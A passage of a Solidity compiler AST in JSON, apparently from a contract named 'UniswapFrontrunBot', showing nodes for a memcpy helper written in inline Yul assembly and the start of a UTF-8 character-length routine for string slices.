																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"argumentTypes": null,
																		"id": 477,
																		"name": "len",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 452,
																		"src": "5986:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "5981:8:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 479,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "5980:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "5973:17:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "31",
														"id": 481,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "5993:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"src": "5973:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5961:33:0"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "6014:168:0",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "6029:41:0",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "src",
																				"nodeType": "YulIdentifier",
																				"src": "6054:3:0"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "6048:5:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "6048:10:0"
																	},
																	{
																		"arguments": [
																			{
																				"name": "mask",
																				"nodeType": "YulIdentifier",
																				"src": "6064:4:0"
																			}
																		],
																		"functionName": {
																			"name": "not",
																			"nodeType": "YulIdentifier",
																			"src": "6060:3:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "6060:9:0"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "6044:3:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "6044:26:0"
															},
															"variables": [
																{
																	"name": "srcpart",
																	"nodeType": "YulTypedName",
																	"src": "6033:7:0",
																	"type": ""
																}
															]
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "6084:38:0",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dest",
																				"nodeType": "YulIdentifier",
																				"src": "6110:4:0"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "6104:5:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "6104:11:0"
																	},
																	{
																		"name": "mask",
																		"nodeType": "YulIdentifier",
																		"src": "6117:4:0"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "6100:3:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "6100:22:0"
															},
															"variables": [
																{
																	"name": "destpart",
																	"nodeType": "YulTypedName",
																	"src": "6088:8:0",
																	"type": ""
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "dest",
																		"nodeType": "YulIdentifier",
																		"src": "6143:4:0"
																	},
																	{
																		"arguments": [
																			{
																				"name": "destpart",
																				"nodeType": "YulIdentifier",
																				"src": "6152:8:0"
																			},
																			{
																				"name": "srcpart",
																				"nodeType": "YulIdentifier",
																				"src": "6162:7:0"
																			}
																		],
																		"functionName": {
																			"name": "or",
																			"nodeType": "YulIdentifier",
																			"src": "6149:2:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "6149:21:0"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "6136:6:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "6136:35:0"
															},
															"nodeType": "YulExpressionStatement",
															"src": "6136:35:0"
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 448,
														"isOffset": false,
														"isSlot": false,
														"src": "6110:4:0",
														"valueSize": 1
													},
													{
														"declaration": 448,
														"isOffset": false,
														"isSlot": false,
														"src": "6143:4:0",
														"valueSize": 1
													},
													{
														"declaration": 474,
														"isOffset": false,
														"isSlot": false,
														"src": "6064:4:0",
														"valueSize": 1
													},
													{
														"declaration": 474,
														"isOffset": false,
														"isSlot": false,
														"src": "6117:4:0",
														"valueSize": 1
													},
													{
														"declaration": 450,
														"isOffset": false,
														"isSlot": false,
														"src": "6054:3:0",
														"valueSize": 1
													}
												],
												"id": 484,
												"nodeType": "InlineAssembly",
												"src": "6005:177:0"
											}
										]
									},
									"documentation": null,
									"id": 486,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "memcpy",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 453,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 448,
												"mutability": "mutable",
												"name": "dest",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 486,
												"src": "5652:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 447,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "5652:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 450,
												"mutability": "mutable",
												"name": "src",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 486,
												"src": "5663:8:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 449,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "5663:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 452,
												"mutability": "mutable",
												"name": "len",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 486,
												"src": "5673:8:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 451,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "5673:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5651:31:0"
									},
									"returnParameters": {
										"id": 454,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "5696:0:0"
									},
									"scope": 1680,
									"src": "5636:553:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 632,
										"nodeType": "Block",
										"src": "6465:1060:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 496,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 493,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 488,
															"src": "6480:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																"typeString": "struct UniswapFrontrunBot.slice memory"
															}
														},
														"id": 494,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 36,
														"src": "6480:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 495,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6493:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "6480:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 500,
												"nodeType": "IfStatement",
												"src": "6476:55:0",
												"trueBody": {
													"id": 499,
													"nodeType": "Block",
													"src": "6496:35:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 497,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "6518:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"functionReturnParameters": 492,
															"id": 498,
															"nodeType": "Return",
															"src": "6511:8:0"
														}
													]
												}
											},
											{
												"assignments": [
													502
												],
												"declarations": [
													{
														"constant": false,
														"id": 502,
														"mutability": "mutable",
														"name": "word",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 632,
														"src": "6544:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 501,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6544:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 503,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "6544:9:0"
											},
											{
												"assignments": [
													505
												],
												"declarations": [
													{
														"constant": false,
														"id": 505,
														"mutability": "mutable",
														"name": "length",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 632,
														"src": "6564:11:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 504,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6564:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 506,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "6564:11:0"
											},
											{
												"assignments": [
													508
												],
												"declarations": [
													{
														"constant": false,
														"id": 508,
														"mutability": "mutable",
														"name": "divisor",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 632,
														"src": "6586:12:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 507,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6586:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 512,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_rational_452312848583266388373324160190187140051835877600158453279131187530910662656_by_1",
														"typeString": "int_const 4523...(67 digits omitted)...2656"
													},
													"id": 511,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"hexValue": "32",
														"id": 509,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6601:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_2_by_1",
															"typeString": "int_const 2"
														},
														"value": "2"
													},
													"nodeType": "BinaryOperation",
													"operator": "**",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "323438",
														"id": 510,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6606:3:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_248_by_1",
															"typeString": "int_const 248"
														},
														"value": "248"
													},
													"src": "6601:8:0",
													"typeDescriptions": {
														"typeIdentifier": "t_rational_452312848583266388373324160190187140051835877600158453279131187530910662656_by_1",
														"typeString": "int_const 4523...(67 digits omitted)...2656"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6586:23:0"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "6677:38:0",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "6679:34:0",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "self",
																						"nodeType": "YulIdentifier",
																						"src": "6702:4:0"
																					},
																					{
																						"kind": "number",
																						"nodeType": "YulLiteral",
																						"src": "6708:2:0",
																						"type": "",
																						"value": "32"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "6698:3:0"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "6698:13:0"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "6692:5:0"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "6692:20:0"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "6686:5:0"
																},
																"nodeType": "YulFunctionCall",
																"src": "6686:27:0"
															},
															"variableNames": [
																{
																	"name": "word",
																	"nodeType": "YulIdentifier",
																	"src": "6679:4:0"
																}
															]
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 488,
														"isOffset": false,
														"isSlot": false,
														"src": "6702:4:0",
														"valueSize": 1
													},
													{
														"declaration": 502,
														"isOffset": false,
														"isSlot": false,
														"src": "6679:4:0",
														"valueSize": 1
													}
												],
												"id": 513,
												"nodeType": "InlineAssembly",
												"src": "6668:47:0"
											},
											{
												"assignments": [
													515
												],
												"declarations": [
													{
														"constant": false,
														"id": 515,
														"mutability": "mutable",
														"name": "b",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 632,
														"src": "6725:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 514,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "6725:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 519,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 518,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 516,
														"name": "word",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 502,
														"src": "6734:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"argumentTypes": null,
														"id": 517,
														"name": "divisor",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 508,
														"src": "6741:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "6734:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "6725:23:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 522,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 520,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 515,
														"src": "6763:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30783830",
														"id": 521,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "6767:4:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_128_by_1",
															"typeString": "int_const 128"
														},
														"value": "0x80"
													},
													"src": "6763:8:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 534,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 532,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 515,
															"src": "6841:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "<",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "30784530",
															"id": 533,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "6845:4:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_224_by_1",
																"typeString": "int_const 224"
															},
															"value": "0xE0"
														},
														"src": "6841:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": {
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 548,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 546,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 515,
																"src": "6926:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30784630",
																"id": 547,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "6930:4:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_240_by_1",
																	"typeString": "int_const 240"
																},
																"value": "0xF0"
															},
															"src": "6926:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": {
															"id": 570,
															"nodeType": "Block",
															"src": "7008:66:0",
															"statements": [
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 564,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 560,
																			"name": "ret",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 491,
																			"src": "7023:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 563,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 561,
																				"name": "b",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 515,
																				"src": "7029:1:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "&",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30783037",
																				"id": 562,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "7033:4:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_7_by_1",
																					"typeString": "int_const 7"
																				},
																				"value": "0x07"
																			},
																			"src": "7029:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"src": "7023:14:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 565,
																	"nodeType": "ExpressionStatement",
																	"src": "7023:14:0"
																},
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 568,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 566,
																			"name": "length",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 505,
																			"src": "7052:6:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"hexValue": "34",
																			"id": 567,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "7061:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_4_by_1",
																				"typeString": "int_const 4"
																			},
																			"value": "4"
																		},
																		"src": "7052:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 569,
																	"nodeType": "ExpressionStatement",
																	"src": "7052:10:0"
																}
															]
														},
														"id": 571,
														"nodeType": "IfStatement",
														"src": "6923:151:0",
														"trueBody": {
															"id": 559,
															"nodeType": "Block",
															"src": "6936:66:0",
															"statements": [
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 553,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 549,
																			"name": "ret",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 491,
																			"src": "6951:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 552,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 550,
																				"name": "b",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 515,
																				"src": "6957:1:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "&",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30783046",
																				"id": 551,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "6961:4:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_15_by_1",
																					"typeString": "int_const 15"
																				},
																				"value": "0x0F"
																			},
																			"src": "6957:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"src": "6951:14:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 554,
																	"nodeType": "ExpressionStatement",
																	"src": "6951:14:0"
																},
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 557,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 555,
																			"name": "length",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 505,
																			"src": "6980:6:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"hexValue": "33",
																			"id": 556,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "6989:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_3_by_1",
																				"typeString": "int_const 3"
																			},
																			"value": "3"
																		},
																		"src": "6980:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 558,
																	"nodeType": "ExpressionStatement",
																	"src": "6980:10:0"
																}
															]
														}
													},
													"id": 572,
													"nodeType": "IfStatement",
													"src": "6838:236:0",
													"trueBody": {
														"id": 545,
														"nodeType": "Block",
														"src": "6851:66:0",
														"statements": [
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 539,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftHandSide": {
																		"argumentTypes": null,
																		"id": 535,
																		"name": "ret",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 491,
																		"src": "6866:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "Assignment",
																	"operator": "=",
																	"rightHandSide": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		"id": 538,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"id": 536,
																			"name": "b",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 515,
																			"src": "6872:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "&",
																		"rightExpression": {
																			"argumentTypes": null,
																			"hexValue": "30783146",
																			"id": 537,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "6876:4:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_31_by_1",
																				"typeString": "int_const 31"
																			},
																			"value": "0x1F"
																		},
																		"src": "6872:8:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "6866:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 540,
																"nodeType": "ExpressionStatement",
																"src": "6866:14:0"
															},
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 543,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftHandSide": {
																		"argumentTypes": null,
																		"id": 541,
																		"name": "length",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 505,
																		"src": "6895:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "Assignment",
																	"operator": "=",
																	"rightHandSide": {
																		"argumentTypes": null,
																		"hexValue": "32",
																		"id": 542,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "6904:1:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_2_by_1",
																			"typeString": "int_const 2"
																		},
																		"value": "2"
																	},
																	"src": "6895:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 544,
																"nodeType": "ExpressionStatement",
																"src": "6895:10:0"
															}
														]
													}
												},
												"id": 573,
												"nodeType": "IfStatement",
												"src": "6759:315:0",
												"trueBody": {
													"id": 531,
													"nodeType": "Block",
													"src": "6773:59:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 525,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 523,
																	"name": "ret",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 491,
																	"src": "6788:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"id": 524,
																	"name": "b",
